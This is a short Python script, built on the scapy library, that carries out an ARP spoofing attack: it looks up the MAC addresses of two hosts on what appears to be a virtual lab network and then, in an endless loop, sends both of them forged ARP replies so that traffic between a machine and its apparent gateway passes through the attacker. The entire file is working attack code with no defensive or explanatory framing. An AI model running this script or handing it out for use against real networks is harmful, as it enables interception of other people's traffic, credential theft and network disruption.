
import scapy.all as scapy
import time
def get_mac_address(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_b = broadcast/arp_req
    answered_list = scapy.srp(arp_req_b, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)
packets_amount = 0
while True:
    spoof("10.0.2.15", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.15")
    packets_amount+=2
    print("[+] Packets sent: ", packets_amount)
    time.sleep(2)
